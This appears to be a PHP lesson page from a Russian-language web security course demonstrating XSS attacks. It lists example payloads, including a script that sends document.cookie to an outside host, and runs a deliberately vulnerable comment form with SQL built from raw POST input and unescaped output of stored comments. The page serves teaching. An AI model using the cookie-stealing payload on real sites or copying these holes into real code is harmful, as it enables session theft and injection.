<?php
/**
 * Created by PhpStorm.
 * User: uchebavadim
 * Date: 07/04/2019
 * Time: 23:18
 */
?>

<!doctype html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>XSS-atacs</title>
    <link rel="stylesheet" href="css/lesson-5.css">
</head>
<body>
    <div class="name">
        <h1>
            XSS - атаки
        </h1>
        <p>это внедрение произвольного HTML-кода или JS-кода(через html) на страницу </p>
    </div>
    <hr>
    <hr>
    <div class="example">
        <p>в текстовом поле вводим текст в теге &lt;h1&gt;ура&lt;/h1&gt</p>
        <p>1)так же можно не закрыть тег, 2)вставить javascript, 3)вставить скрипт</p>
        <p>&lt;script&gt;while(true)alert("Манагер дурень!") &lt;/script&gt; - 'вечный цикл'</p>
        <p>переворачиваем сайт - &lt;style&gt;body{transform: rotate(180deg);}&lt;/style&gt;</p>
        <p>вставляем фрейм: видео с youtube - &lt;iframe width="560" height="315" src="https://www.youtube.com/watch?v=5b4Z6ObkNHA"&gt&lt;/iframe&gt;</p>
        <p>скрипт который может отправить куки - &lt;script&gt;var img = new Image(); img .src = 'http://site.ru/img.jpg?id=' + document.cookie</p>
        <hr>
        <p>для исправления есть две функции "strip_tags", "htmlspecialchars"</p>
    </div>
    <br>
    <hr>
    <hr>
    <ul class="link">
        <li><a href="index.php">home</a></li>
        <li><a href="security.php">security</a></li>
        <li><a href="XSS-fix.php">FIX</a></li>
        <li><a href="XSS_&_moderate.php">MODER</a></li>
        <li><a href="SQL-injections.php">SQL</a></li>
    </ul>
    <hr>
    <hr>
<!--    ##############################################-->
    <?php

    $db = new PDO ('mysql:host=localhost;dbname=mySite', 'root', '');//подключаемся к базе данных "mySite"
    $db->exec("SET NAMES UTF8");//прописываем шрифт для базы данных

    //если отправка произошла из формы
    if(count($_POST) > 0) {
        $name = trim($_POST['name']);
        $text = trim($_POST['text']);

//        вставляем сюда "strip_tags", "htmlspecialchars"

        if ($name != '' && $text != ''){
            $query = $db->prepare("INSERT INTO comments SET name='$name', text='$text'");//подготовка занесение данных в таблицу "comments" в базе данных "mySite"
            $query->execute();//выполнение занесения данных в таблицу

            header("Location: XSS-attack.php");//возвращаемся на нашу страницу методом "GET"
            exit();
        }
    }

    $query = $db->prepare("SELECT * FROM comments ORDER BY dt DESC ");//выбираем все данные в таблице "comments" с сортировкой по дате "ORDER BY dt DESC" по убыванию новые вверху для вывода данных
    $query->execute();//выполнение вывода данных
    $comments = $query->fetchAll();//после выполнения перегонка всех данных в двумерный массив

//    выведем массив (fetchAll)
//    echo '<pre>';
//    print_r($comments);
//    echo '</pre>';
    ?>


<!--    ##############################################-->
<div class="form">
    <form method="post">
        <p>
            <label for="name">Укажите ваше имя:</label><br>
            <input id="name" type="text" name="name" value="<?=@$name;?>" placeholder="Ваше имя" autofocus>
        </p>
        <p>
            <label for="text">Ваше сообщение:</label><br>
            <textarea name="text" id="text" cols="30" rows="10"><?=@$text;?></textarea>
        </p>
        <input type="submit" value="Отправить">
    </form>
</div>


    <br>
    <hr>
    <hr>
<!--Выводим данные на экран-->
    <div class="comments">
        <? foreach ($comments as $one) :?>
            <div class="item">
                <span><?=$one['dt']?></span>
                <div class="name_comment">
                    <strong>--><?=$one['name']?>:</strong>
                </div>

                <div><?=$one['text']?></div>
            </div>
            <hr>
        <? endforeach; ?>
    </div>
</body>
</html>
